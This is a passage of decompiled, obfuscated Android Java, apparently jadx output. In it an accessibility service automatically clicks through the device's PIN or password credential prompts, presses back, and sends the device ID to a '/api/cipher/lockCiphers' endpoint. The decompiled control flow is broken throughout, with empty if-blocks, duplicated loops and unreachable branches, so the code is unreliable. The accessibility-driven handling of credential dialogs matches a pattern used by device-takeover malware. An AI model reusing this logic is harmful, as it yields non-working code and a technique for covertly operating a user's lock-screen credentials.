                                                if (g0Var.m1072k().findOneByOperateOr(g0.m1091U()) == null) {
                                                    if (AbstractC0249e.m620i()) {
                                                        break;
                                                    }
                                                    if (AbstractC0249e.m623l()) {
                                                        if (g0Var.m1072k().findOneByCombine(g0.m1094Z()) == null) {
                                                            break;
                                                        }
                                                    }
                                                    break;
                                                }
                                            }
                                        }
                                        z3 = true;
                                        ConcurrentLinkedQueue concurrentLinkedQueue2 = g0Var.f893o;
                                        if (!z3) {
                                            if (!g0Var.m1098O() && !g0Var.m1097N()) {
                                                JsonObject m419b = AbstractC0207l.m419b(new ReqDefaultBodyVO(AbstractC0252h.m708l("deviceId")), AbstractC0207l.f252a, "/api/cipher/lockCiphers");
                                                if (m419b != null) {
                                                    AbstractC0186i.m355a(m419b.toString());
                                                    if (!g0Var.m1098O()) {
                                                        break;
                                                    }
                                                }
                                            }
                                            str3 = "confirmByLocalCipherLocked Success";
                                            Log.d("UseDeviceCredentialDelegate", str3);
                                            concurrentLinkedQueue2.remove("inUseDeviceCredential");
                                            break;
                                        } else {
                                            Log.d("UseDeviceCredentialDelegate", "not inVerifyCredentialWindow");
                                        }
                                        atomicInteger = new AtomicInteger(0);
                                        while (true) {
                                            if (atomicInteger.incrementAndGet() > 10) {
                                                UiObject m1072k3 = g0Var.m1072k();
                                                CombineFiltersWithOr combineFiltersWithOr2 = new CombineFiltersWithOr();
                                                combineFiltersWithOr2.setFilters(new LinkedList());
                                                combineFiltersWithOr2.getFilters().add(g0.m1088J());
                                                combineFiltersWithOr2.getFilters().add(g0.m1087I());
                                                combineFiltersWithOr2.getFilters().add(g0.m1086H());
                                                UiObject findOneByOperateOr2 = m1072k3.findOneByOperateOr(combineFiltersWithOr2);
                                                if (findOneByOperateOr2 == null || !findOneByOperateOr2.click()) {
                                                    AbstractC0251g.T0(2);
                                                    MyAccessibilityService.m548I(g0Var.m1072k());
                                                } else {
                                                    str3 = "closeButton click Success";
                                                }
                                            } else {
                                                while (!g0Var.m1095K()) {
                                                    AbstractC0251g.F0(1);
                                                    AbstractC0251g.T0(5);
                                                    Log.d("UseDeviceCredentialDelegate", "back Success");
                                                }
                                                str3 = "finish inUseDeviceCredential";
                                            }
                                        }
                                        Log.d("UseDeviceCredentialDelegate", str3);
                                        concurrentLinkedQueue2.remove("inUseDeviceCredential");
                                    }
                                    z3 = false;
                                    ConcurrentLinkedQueue concurrentLinkedQueue22 = g0Var.f893o;
                                    if (!z3) {
                                    }
                                    atomicInteger = new AtomicInteger(0);
                                    while (true) {
                                        if (atomicInteger.incrementAndGet() > 10) {
                                        }
                                        AbstractC0251g.T0(2);
                                        MyAccessibilityService.m548I(g0Var.m1072k());
                                    }
                                    Log.d("UseDeviceCredentialDelegate", str3);
                                    concurrentLinkedQueue22.remove("inUseDeviceCredential");
                                    break;
                                default:
                                    UiObject findOneByCombine = g0Var.m1072k().findOneByCombine(g0.m1086H());
                                    if (findOneByCombine != null && findOneByCombine.click()) {
                                        Log.d("UseDeviceCredentialDelegate", "inAssistCredential Cancel Success");
                                    }
                                    g0Var.f893o.remove("inUseDeviceCredential");
                                    break;
                            }
                        }
                    });
                    return;
                }
                return;
            }
            findOneByOperateOr.click();
            Log.d("UseDeviceCredentialDelegate", "已点击密码验证引导按钮");
        }
        z2 = false;
        if (z2) {
        }
    }
}
